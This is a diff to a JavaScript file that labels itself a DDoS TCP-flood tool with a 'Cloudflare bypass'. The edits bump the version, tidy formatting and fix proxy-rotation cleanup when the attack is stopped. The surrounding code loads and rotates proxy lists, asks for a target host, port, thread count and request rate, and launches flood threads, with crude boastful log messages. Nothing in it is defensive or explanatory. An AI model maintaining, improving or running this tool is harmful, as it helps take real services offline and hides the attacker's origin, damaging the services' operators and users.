@@ -5,7 +5,7 @@
 // ******************************************************************************
 
 // ******************************************************************************
-// * DDoS TOOL - TCP FLOOD - v9.9 - ARMAGEDDON EDITION! - CLOUDFLARE BYPASS+++*
+// * DDoS TOOL - TCP FLOOD - v9.9.1 - ARMAGEDDON EDITION! - CLOUDFLARE BYPASS+++*
 // ******************************************************************************
 
 // Import required modules at the top
@@ -16,11 +16,11 @@ const tls = require('tls'); // Required for TLS/SSL
 const https = require('https'); // Required for HTTPS proxy support and bypass certificate issues
 const url = require('url');
 const dns = require('dns').promises;
-const { HttpsProxyAgent } = require('https-proxy-agent');
+const {HttpsProxyAgent} = require('https-proxy-agent');
 const fs = require('fs'); // File system module for logging
-const { fetch } = require('cross-fetch'); // Cross-browser fetch
+const {fetch} = require('cross-fetch'); // Cross-browser fetch
 const stream = require('stream');
-const { pipeline } = stream.promises;
+const {pipeline} = stream.promises;
 const path = require('path');
 
 // Configuration - Let's fuck things up HARD!
@@ -84,6 +84,7 @@ let proxies = []; // Store proxy list
 let activeThreads = 0; // Counter for active threads
 let threadHealth = []; // Store thread health data
 let currentProxyIndex = 0;
+let proxyRotationTimeout; // Timeout ID for proxy rotation
 
 // Load Proxies from JSON file
 async function loadProxiesFromJson(filePath) {
@@ -597,7 +598,7 @@ function askForDetails() {
             return;
         }
 
-         requestInterval = parseInt(prompt(`${purple}Enter request interval in milliseconds (0 for max speed):${resetColor}`));
+        requestInterval = parseInt(prompt(`${purple}Enter request interval in milliseconds (0 for max speed):${resetColor}`));
         if (isNaN(requestInterval)) {
             alert(`${darkRed}Invalid request interval! Use a number, moron!${resetColor}`);
             window.close();
@@ -678,7 +679,7 @@ async function main() {
     if (proxyListURL) {
         await loadProxies(proxyListURL);
     } else {
-         await loadProxiesFromJson('/public/main/proxies.json'); // Load from JSON if no URL is provided
+        await loadProxiesFromJson('/public/main/proxies.json'); // Load from JSON if no URL is provided
     }
 
     log(`${darkGreen}[MAIN] Starting DDoS attack against ${targetHost}:${port} with ${threads} threads - FUCK YEAH!${resetColor}`);
@@ -687,7 +688,7 @@ async function main() {
     timerInterval = setInterval(updateTimer, 1000);
 
     setInterval(adjustThreads, 10000);
-    setInterval(rotateProxies, proxyRotationInterval); // Rotate Proxies Every 60 seconds
+    proxyRotationTimeout = setInterval(rotateProxies, proxyRotationInterval); // Rotate Proxies Every 60 seconds
 
     for (let i = 0; i < threads; i++) {
         tcpFlood(i + 1);
@@ -704,6 +705,7 @@ startButton.addEventListener('click', () => {
 stopButton.addEventListener('click', () => {
     isRunning = false;
     clearInterval(timerInterval);
+    clearInterval(proxyRotationTimeout); // Clear the proxy rotation interval
     startButton.disabled = false;
     stopButton.disabled = true;
     log(`${darkGreen}[MAIN] Attack stopped manually.${resetColor}`);
